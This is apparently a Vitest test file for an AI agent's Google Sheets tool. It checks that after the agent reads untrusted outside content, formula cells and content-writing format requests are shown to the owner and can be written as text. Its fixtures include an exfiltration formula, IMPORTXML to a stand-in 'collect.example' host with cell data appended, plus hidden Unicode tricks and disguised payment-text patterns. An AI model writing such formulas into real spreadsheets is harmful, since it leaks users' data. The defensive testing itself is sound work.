import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from 'vitest';
import { createSheetsTool, FORMULAS_SHOWN, FORMAT_REQUESTS_SHOWN, FORMAT_LINE_MAX } from './google-sheets.js';
import { startsLikeFormula, formulaCells, formulasAsText } from './sheets-formula.js';
import type { IAgent, PromptText } from '../../types/index.js';
import type { GoogleAuth } from './google-auth.js';
import { FULL_SCOPES } from './google-auth.js';
import { flattenPrompt, promptSegments } from '../../core/prompt-value.js';

vi.mock('node:dns/promises', () => ({
  default: { lookup: vi.fn(async () => dnsLookupStub()) },
}));

import { installPinnedFetchBridge, dnsLookupStub } from '../../../tests/helpers/pinned-fetch-bridge.js';

let restorePinnedFetchBridge: (() => void) | undefined;
beforeAll(() => { restorePinnedFetchBridge = installPinnedFetchBridge(); });
afterAll(() => { restorePinnedFetchBridge?.(); });

const mockFetch = vi.fn();
vi.stubGlobal('fetch', mockFetch);

function auth(): GoogleAuth {
  return {
    getAccessToken: vi.fn().mockResolvedValue('mock-token'),
    hasScope: vi.fn().mockImplementation((s: string) => FULL_SCOPES.includes(s)),
    hasOwnClientPair: vi.fn().mockReturnValue(true),
    usesServiceAccount: vi.fn().mockReturnValue(false),
  } as unknown as GoogleAuth;
}

type Taint = 'none' | 'sawUntrustedData' | 'sawExternalContentTool' | 'conversationSawUntrusted';

/** An agent whose run has (or has not) read content from outside, answering with `answer`. */
function agent(taint: Taint, answer?: string): IAgent {
  return {
    name: 'test', model: 'test-model', memory: null, tools: [], onStream: null,
    ...(taint === 'none' ? {} : { [taint]: true }),
    promptUser: answer === undefined ? undefined : vi.fn().mockResolvedValue(answer),
  } as unknown as IAgent;
}

function asked(a: IAgent): { prompt: PromptText; options: string[] } {
  const call = (a.promptUser as ReturnType<typeof vi.fn>).mock.calls[0]!;
  return { prompt: call[0] as PromptText, options: call[1] as string[] };
}

function sentValues(): unknown[][] {
  return (JSON.parse((mockFetch.mock.calls[0]![1] as { body: string }).body) as { values: unknown[][] }).values;
}

function sentUrl(): string {
  const target = mockFetch.mock.calls[0]![0] as string | URL | Request;
  return typeof target === 'string' ? target : target instanceof URL ? target.href : target.url;
}

const FETCHING = '=IMPORTXML("https://collect.example/p?d="&A1, "//a")';
const WRITTEN = { ok: true, json: async () => ({ updatedRange: 'Sheet1!B2:C3', updatedRows: 2, updatedColumns: 2, updatedCells: 4 }) };
const APPENDED = { ok: true, json: async () => ({ updates: { updatedRange: 'Sheet1!A9:B9', updatedRows: 1, updatedCells: 2 } }) };

/** Said wherever a question shows a formula: the functions are examples, and the address may be built. */
const FETCHES = 'A formula can make Google fetch an address and send data from the sheet with it: functions such as IMPORTXML, IMPORTHTML, IMPORTDATA, IMPORTFEED, IMPORTRANGE and IMAGE do, and other functions can too. The address need not be written out, since a formula can build it from other cells.';
const HIDDEN = 'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.';
const PLAIN_WRITE_QUESTION = 'Overwrite range "Sheet1!B2:C3" in spreadsheet sid? This will replace existing data.';

describe('a cell that starts like a formula', () => {
  it.each([
    ['=A1', true], ['  =SUM(A1:A3)', true], ['+A1', true], ['-A1', true], ['- item', true],
    ['-5', false], ['+3.5', false], ['1,5', false], ['12%', false], ['-1e3', false],
    ['Alice', false], ['', false], ['a=b', false],
    // Read as Google might normalise it: a full-width sign, an invisible character in front.
    ['＝IMPORTXML("https://x.example", "//a")', true], ['\u200b=A1', true], ['\ufeff=A1', true], ['＋A1', true],
    // …and a signed number stays a number after that: each of these would count as a formula
    // if the value were not folded and cleaned before the plain-number test.
    ['-５', false], ['-\u200b5', false], ['+１,５', false], ['-1\u200b2', false],
    // …while a value with no sign in front is no formula, folded or not.
    ['\u200b12', false], ['Ａlice', false], ['１,５', false],
  ])('%j is counted as a formula: %s', (value, expected) => {
    expect(startsLikeFormula(value)).toBe(expected);
  });

  it('is never a value that is not a string', () => {
    expect(startsLikeFormula(5)).toBe(false);
    expect(startsLikeFormula(null)).toBe(false);
    expect(startsLikeFormula(true)).toBe(false);
  });

  it('names a written cell by its address from the range, and any other by its place in the values', () => {
    const values = [['a', '=1+1'], ['=B9', 'b']];
    expect(formulaCells(values, 'Sheet1!B2:C3', 'write')).toEqual([{ cell: 'C2', formula: '=1+1' }, { cell: 'B3', formula: '=B9' }]);
    expect(formulaCells([['=x']], "'My sheet'!$Z$10", 'write')).toEqual([{ cell: 'Z10', formula: '=x' }]);
    expect(formulaCells([['a', '=x']], 'Z1', 'write')).toEqual([{ cell: 'AA1', formula: '=x' }]);
    const byPlace = [{ cell: '1st row, 2nd value', formula: '=1+1' }, { cell: '2nd row, 1st value', formula: '=B9' }];
    expect(formulaCells(values, 'Sheet1', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!B:C', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!R2C3', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!B2:C3', 'append')).toEqual([{ cell: '1st new row, 2nd value', formula: '=1+1' }, { cell: '2nd new row, 1st value', formula: '=B9' }]);
  });

  it('counts the rows in English ordinals', () => {
    const cells = formulaCells(Array.from({ length: 23 }, () => ['=x']), 'Sheet1', 'append').map((c) => c.cell.split(' ')[0]);
    expect([0, 1, 2, 3, 10, 11, 12, 20, 21, 22].map((i) => cells[i])).toEqual(['1st', '2nd', '3rd', '4th', '11th', '12th', '13th', '21st', '22nd', '23rd']);
  });

  it('writes only the formula cells as text', () => {
    expect(formulasAsText([['a', '=1+1', 5], ['-x', '-5'], ['\u200b=A1']])).toEqual([['a', "'=1+1", 5], ["'-x", '-5'], ["'\u200b=A1"]]);
  });
});

describe('google_sheets after content from outside the chat', () => {
  beforeEach(() => { vi.clearAllMocks(); });

  const write = { action: 'write' as const, spreadsheet_id: 'sid', range: 'Sheet1!B2:C3', values: [['Name', FETCHING], ['=B2', 'Bob']] };

  it('shows each formula cell with its whole formula, and offers text first', async () => {
    const a = agent('sawUntrustedData', 'Write as text');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    const { prompt, options } = asked(a);
    expect(options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(prompt)).toBe([
      PLAIN_WRITE_QUESTION,
      '',
      `This chat has read content from outside lynox, such as a web page, an email or a file. 2 of these cells start like a formula, and Google runs a formula when it is written. ${FETCHES}`,
      `C2: ${FETCHING}`,
      'B3: =B2',
    ].join('\n'));
    // The cell and the whole formula are values, set apart from the question's own words.
    const values = promptSegments(prompt).filter((s) => s.kind === 'value').map((s) => s.text);
    expect(values).toContain(FETCHING);
    expect(values).toContain('C2');
  });

  it('writes the formula cells as text when the owner chooses text, and every other cell as given', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Write as text'));
    expect(result).toContain('Data written successfully');
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('takes the answer by its number too', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, agent('sawUntrustedData', '1'));
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('writes the formulas when the owner chooses formulas', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Write as formulas'));
    expect(sentValues()).toEqual(write.values);
  });

  it('writes nothing when the owner chooses not to write', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Don’t write'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('writes nothing for an answer that is no option', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Yes'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it.each(['sawExternalContentTool', 'conversationSawUntrusted'] as const)('counts content from outside by %s as well', async (taint) => {
    const a = agent(taint, 'Write as text');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('refuses in a run nobody watches, and writes nothing', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData'));
    expect(result).toContain('requires user confirmation');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('asks as always, and writes the formulas as given, before any content from outside', async () => {
    const a = agent('none', 'Yes');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
    expect(sentValues()).toEqual(write.values);
    expect(sentUrl()).toContain('valueInputOption=USER_ENTERED');
  });

  it('asks as always when no cell starts like a formula', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler({ ...write, values: [['Name', '-5'], ['Alice', 'Bob']] }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
  });

  it('says "1 of these cells starts" for one cell', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, values: [['=B2']] }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain('a file. 1 of these cells starts like a formula, and Google');
  });

  it('shows five formulas, counts the rest, and then does not offer to write formulas the owner was not shown, saying why', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=6', '=7']] }, a);
    const lines = flattenPrompt(asked(a).prompt).split('\n');
    expect(lines.slice(-7)).toEqual(['A1: =1', 'B1: =2', 'C1: =3', 'D1: =4', 'E1: =5', 'and 2 more',
      HIDDEN]);
    expect(lines[2]).toContain('7 of these cells start like a formula');
    expect(asked(a).options).toEqual(['Write as text', 'Don’t write']);
  });

  it('writes nothing when "Write as formulas" is answered though it was not offered', async () => {
    const result = await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=IMAGE("https://x.example")']] }, agent('sawUntrustedData', 'Write as formulas'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('says why and offers two choices from the sixth formula on', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=6']] }, a);
    expect(flattenPrompt(asked(a).prompt).split('\n').slice(-2)).toEqual(['and 1 more', HIDDEN]);
    expect(asked(a).options).toEqual(['Write as text', 'Don’t write']);
    // The sentence is the question's own words, not a value set apart.
    expect(promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text))
      .toEqual(['A1', 'sid', '6', 'A1', '=1', 'B1', '=2', 'C1', '=3', 'D1', '=4', 'E1', '=5', '1']);
  });

  it('names in its sentence the number of formulas it shows', () => {
    expect(HIDDEN).toContain(`write at most ${FORMULAS_SHOWN} at a time`);
  });

  it('offers to write formulas when exactly five are shown and none is hidden', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5']] }, a);
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(asked(a).prompt)).not.toContain('more');
    expect(flattenPrompt(asked(a).prompt)).not.toContain(HIDDEN);
  });

  it('keeps a formula whole but on one line, so it cannot draw another cell', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    const long = `=IMPORTXML("https://collect.example/${'p'.repeat(300)}", "//a")`;
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [[`${long}\nB1: =harmless`]] }, a);
    const values = promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text);
    expect(values).toContain(`${long} B1: =harmless`);
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`A1: ${long} B1: =harmless`);
  });

  it('asks the same for an append, naming the cells by their place among the new rows', async () => {
    const a = agent('sawUntrustedData', 'Write as text');
    mockFetch.mockResolvedValueOnce(APPENDED);
    const result = await createSheetsTool(auth).handler({ action: 'append', spreadsheet_id: 'sid', range: 'Sheet1!A:B', values: [['x', FETCHING]] }, a);
    expect(result).toContain('Data appended');
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(asked(a).prompt).split('\n')[0]).toBe('Add rows to range "Sheet1!A:B" in spreadsheet sid? Nothing is overwritten.');
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`1st new row, 2nd value: ${FETCHING}`);
    expect(sentValues()).toEqual([['x', `'${FETCHING}`]]);
  });

  it('asks an append as adding rows, not as overwriting, before any content from outside', async () => {
    const a = agent('none', 'Yes');
    mockFetch.mockResolvedValueOnce(APPENDED);
    await createSheetsTool(auth).handler({ action: 'append', spreadsheet_id: 'sid', range: 'Sheet1!A:B', values: [['x', FETCHING]] }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe('Add rows to range "Sheet1!A:B" in spreadsheet sid? Nothing is overwritten.');
    expect(sentUrl()).toContain('insertDataOption=INSERT_ROWS');
  });

});

describe('google_sheets format after content from outside the chat', () => {
  beforeEach(() => { vi.clearAllMocks(); });

  const PLAIN_FORMAT_QUESTION = 'Apply batch changes to spreadsheet sid? Formatting requests can delete or overwrite cells and sheets.';
  const NOTE_ONE = `This chat has read content from outside lynox, such as a web page, an email or a file. 1 of these requests can write cell content or a rule, or change what a cell reads as, such as a number pattern, a link, the text direction or hidden rows. Content and rules can hold a formula, and Google runs a formula on its side. ${FETCHES} It is shown here in full:`;
  const APPLIED = { ok: true, json: async () => ({ replies: [{}, {}] }) };
  const RANGE = { sheetId: 0, startRowIndex: 0, endRowIndex: 1 };
  const BORDERS = { updateBorders: { range: RANGE, top: { style: 'SOLID' } } };
  const BOLD = { repeatCell: { range: RANGE, cell: { userEnteredFormat: { textFormat: { bold: true } } }, fields: 'userEnteredFormat.textFormat.bold' } };
  const FORMULA_CELLS = { updateCells: { range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: FETCHING } }] }], fields: 'userEnteredValue' } };

  function sentRequests(): unknown[] {
    return (JSON.parse((mockFetch.mock.calls[0]![1] as { body: string }).body) as { requests: unknown[] }).requests;
  }

  it('shows a request that writes a formula in full, with its range and content', async () => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe([PLAIN_FORMAT_QUESTION, '', NOTE_ONE, `updateCells: ${JSON.stringify(FORMULA_CELLS.updateCells)}`].join('\n'));
    // The request is a value, set apart from the question's own words.
    const values = promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text);
    expect(values).toContain(JSON.stringify(FORMULA_CELLS.updateCells));
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('asks the whole batch when a pure formatting request comes with one that writes cells, and sends nothing on no', async () => {
    const a = agent('sawUntrustedData', 'No');
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, a);
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
    expect(a.promptUser).toHaveBeenCalledTimes(1);
    const lines = flattenPrompt(asked(a).prompt).split('\n');
    expect(lines.slice(-2)).toEqual([`updateCells: ${JSON.stringify(FORMULA_CELLS.updateCells)}`, 'and 1 formatting request that writes no cell content']);
  });

  it('sends every request of the batch as given when the owner says yes', async () => {
    mockFetch.mockResolvedValueOnce(APPLIED);
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, agent('sawUntrustedData', 'Yes'));
    expect(sentRequests()).toEqual([BORDERS, FORMULA_CELLS]);
  });

  it('shows a request type it does not know, as one that may write cells', async () => {
    const a = agent('sawUntrustedData', 'No');
    const made = { setSomethingNew: { range: RANGE, value: FETCHING } };
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [made] }, a);
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`setSomethingNew: ${JSON.stringify(made.setSomethingNew)}`);
  });

  it('counts the requests it shows, and keeps each on one line', async () => {
    const a = agent('sawUntrustedData', 'No');
    const paste = { pasteData: { coordinate: { sheetId: 0 }, data: `a,${FETCHING}\nB1: harmless`, delimiter: ',' } };
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [paste, FORMULA_CELLS, 'odd'] }, a);
    const lines = flattenPrompt(asked(a).prompt).split('\n');
    expect(lines[2]).toContain('3 of these requests can write cell content or a rule');
    expect(lines.slice(-3)).toEqual([`pasteData: ${JSON.stringify(paste.pasteData)}`, `updateCells: ${JSON.stringify(FORMULA_CELLS.updateCells)}`, 'request: "odd"']);
  });

  it.each([
    ['a value with the format', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {}, userEnteredValue: { formulaValue: FETCHING } }, fields: 'userEnteredFormat' } }],
    ['a mask that writes the value', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat,userEnteredValue' } }],
    ['a mask for every field', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: '*' } }],
    ['a mask that only starts like the format', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormatting' } }],
    ['a mask with an unclosed group', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(textFormat,userEnteredValue' } }],
    ['a mask with a stray close', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat),userEnteredValue' } }],
    ['no mask', { repeatCell: { range: RANGE, cell: { userEnteredFormat: {} } } }],
    ['two types in one request', { updateBorders: { range: RANGE }, updateCells: FORMULA_CELLS.updateCells }],
    ['a condition rule', { addConditionalFormatRule: { rule: { ranges: [RANGE], booleanRule: { condition: { type: 'CUSTOM_FORMULA', values: [{ userEnteredValue: FETCHING }] } } } } }],
  ])('shows a repeatCell or request with %s', async (_label, request) => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
  });

  it.each([
    ['borders', [BORDERS]],
    ['a format-only repeatCell', [BOLD]],
    ['the whole cell format with only a background in the cell', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: { backgroundColor: { red: 1 } } }, fields: 'userEnteredFormat' } }]],
    ['the whole text format in a group with only bold in the cell', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: { textFormat: { bold: true } } }, fields: 'userEnteredFormat(backgroundColor,textFormat)' } }]],
    ['a mask nested exactly as deep as it is read', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: `userEnteredFormat${'(backgroundColor'.repeat(8)}${')'.repeat(8)}` } }]],
    ['a grouped format mask', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(backgroundColor,textFormat(bold,italic)), userEnteredFormat.wrapStrategy' } }]],
    ['merges, sizes and bands', [{ mergeCells: { range: RANGE, mergeType: 'MERGE_ALL' } }, { unmergeCells: { range: RANGE } }, { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 30 }, fields: 'pixelSize' } }, { autoResizeDimensions: { dimensions: { sheetId: 0, dimension: 'COLUMNS' } } }, { addBanding: { bandedRange: { range: RANGE } } }, { updateBanding: { bandedRange: { bandedRangeId: 1 }, fields: 'rowProperties' } }, { deleteBanding: { bandedRangeId: 1 } }]],
  ])('asks as always for %s', async (_label, requests) => {
    const a = agent('sawUntrustedData', 'Yes');
    mockFetch.mockResolvedValueOnce(APPLIED);
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: requests }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_FORMAT_QUESTION);
    expect(sentRequests()).toEqual(requests);
  });

  const fmt = (mask: string, format: Record<string, unknown> = {}): unknown => ({ repeatCell: { range: RANGE, cell: { userEnteredFormat: format }, fields: mask } });
  it.each([
    ['a number pattern', fmt('userEnteredFormat.numberFormat', { numberFormat: { type: 'NUMBER', pattern: '"Pay to CH93 0076"' } })],
    ['a pattern path', fmt('userEnteredFormat.numberFormat.pattern', { numberFormat: { pattern: ';;;' } })],
    ['a link path', fmt('userEnteredFormat.textFormat.link', { textFormat: { link: { uri: 'https://collect.example/' } } })],
    ['the whole text format', fmt('userEnteredFormat.textFormat', { textFormat: { link: { uri: 'https://collect.example/' } } })],
    ['a link under the whole cell format', fmt('userEnteredFormat', { backgroundColor: { red: 1 }, textFormat: { link: { uri: 'https://collect.example/' } } })],
    ['a number format under the whole cell format', fmt('userEnteredFormat', { numberFormat: { type: 'TEXT', pattern: '"Pay to CH93 0076"' } })],
    ['a mask for every field', fmt('*', { backgroundColor: { red: 1 } })],
    ['a link display', fmt('userEnteredFormat.hyperlinkDisplayType', { hyperlinkDisplayType: 'LINKED' })],
    ['a text direction', fmt('userEnteredFormat.textDirection', { textDirection: 'RIGHT_TO_LEFT' })],
    ['a link in the cell beside a narrow mask', fmt('userEnteredFormat.backgroundColor', { backgroundColor: { red: 1 }, textFormat: { link: { uri: 'https://collect.example/' } } })],
    ['a number format in the cell beside a narrow mask', fmt('userEnteredFormat.backgroundColor', { numberFormat: { pattern: ';;;' } })],
    ['a mask with a second path after a space', fmt('userEnteredFormat.backgroundColor userEnteredValue')],
    ['a mask with a second path after a slash', fmt('userEnteredFormat.backgroundColor/userEnteredValue')],
    ['a mask with a trailing comma', fmt('userEnteredFormat.backgroundColor,')],
    ['a mask nested past its depth', fmt(`userEnteredFormat${'(backgroundColor'.repeat(9)}${')'.repeat(9)}`)],
    ['rows hidden', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { hiddenByUser: true }, fields: 'hiddenByUser' } }],
    ['rows hidden beside a size', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 3, hiddenByUser: true }, fields: 'pixelSize' } }],
  ])('shows a request with %s', async (_label, request) => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
  });

  /** An updateCells request whose line, before `tail`, is exactly `length` plain characters. */
  function cellsOfLine(length: number, tail = ''): unknown {
    const body = (pad: string) => ({ range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: `${FETCHING}${pad}` } }] }], fields: 'userEnteredValue' });
    const base = `updateCells: ${JSON.stringify(body(''))}`.length;
    return { updateCells: body('p'.repeat(length - base) + tail) };
  }

  it('asks with a request whose line is exactly the longest a question shows', async () => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [cellsOfLine(FORMAT_LINE_MAX)] }, a);
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toHaveLength(FORMAT_LINE_MAX);
  });

  it('refuses a request one character longer than a question shows, without asking or shortening it, and says how to split', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, cellsOfLine(FORMAT_LINE_MAX + 1)] }, a);
    expect(result).toContain(`at most ${FORMAT_REQUESTS_SHOWN}, each at most ${FORMAT_LINE_MAX} characters as shown`);
    expect(result).toContain('Split it');
    expect(a.promptUser).not.toHaveBeenCalled();
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('counts a line by its characters as shown, not by UTF-16 units', async () => {
    const a = agent('sawUntrustedData', 'No');
    const wide = String.fromCodePoint(0x1f600);
    const request = cellsOfLine(FORMAT_LINE_MAX - 10, wide.repeat(10)) as { updateCells: unknown };
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
    const line = flattenPrompt(asked(a).prompt).split('\n').at(-1)!;
    expect([...line]).toHaveLength(FORMAT_LINE_MAX);
    expect(line.length).toBeGreaterThan(FORMAT_LINE_MAX);
  });

  it('counts an unseen character by its escape, so it can push a line past what a question shows', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [cellsOfLine(FORMAT_LINE_MAX - 1, String.fromCharCode(0x200b))] }, a);
    expect(result).toContain('Split it');
    expect(a.promptUser).not.toHaveBeenCalled();
  });

  it('asks with as many requests that write cells as a question shows', async () => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: Array.from({ length: FORMAT_REQUESTS_SHOWN }, () => FORMULA_CELLS) }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain(`${FORMAT_REQUESTS_SHOWN} of these requests can write cell content`);
  });

  it('refuses one request that writes cells more than a question shows, without asking', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: Array.from({ length: FORMAT_REQUESTS_SHOWN + 1 }, () => FORMULA_CELLS) }, a);
    expect(result).toContain(`This call has ${FORMAT_REQUESTS_SHOWN + 1} such request(s)`);
    expect(a.promptUser).not.toHaveBeenCalled();
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('writes an unseen character in a cell value as its escape, and sends the value as given', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    mockFetch.mockResolvedValueOnce(APPLIED);
    const hidden = { updateCells: { range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: '=IMAGE("https://ok.example/\u202e?d="&A1)\u200b\u00a0' } }] }], fields: 'userEnteredValue' } };
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [hidden] }, a);
    const line = flattenPrompt(asked(a).prompt).split('\n').at(-1)!;
    expect(line).toContain('ok.example/\\u202e?d=');
    expect(line).toContain('A1)\\u200b\\u00a0');
    expect(line).not.toMatch(/[\u202e\u200b\u00a0]/);
    expect(sentRequests()).toEqual([hidden]);
  });

  it('writes a line break and a direction character in a type name as escapes, so the name cannot draw a line', async () => {
    const a = agent('sawUntrustedData', 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [{ 'x\nupdateBorders\u202e': {} }] }, a);
    const lines = flattenPrompt(asked(a).prompt).split('\n');
    expect(lines.at(-1)).toBe('x\\u000aupdateBorders\\u202e: {}');
    expect(lines).toHaveLength(4);
  });

  it('refuses requests that are not a list, before asking', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: { updateCells: {} } as unknown as unknown[] }, a);
    expect(result).toBe('Error: "format_requests" must be an array of batchUpdate requests.');
    expect(a.promptUser).not.toHaveBeenCalled();
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('asks as always, before any content from outside, even for a request that writes a formula', async () => {
    const a = agent('none', 'Yes');
    mockFetch.mockResolvedValueOnce(APPLIED);
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_FORMAT_QUESTION);
    expect(sentRequests()).toEqual([FORMULA_CELLS]);
  });

  it.each(['sawExternalContentTool', 'conversationSawUntrusted'] as const)('counts content from outside by %s as well', async (taint) => {
    const a = agent(taint, 'No');
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
  });

  it('refuses in a run nobody watches, and sends nothing', async () => {
    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, agent('sawUntrustedData'));
    expect(result).toContain('requires user confirmation');
    expect(mockFetch).not.toHaveBeenCalled();
  });
});
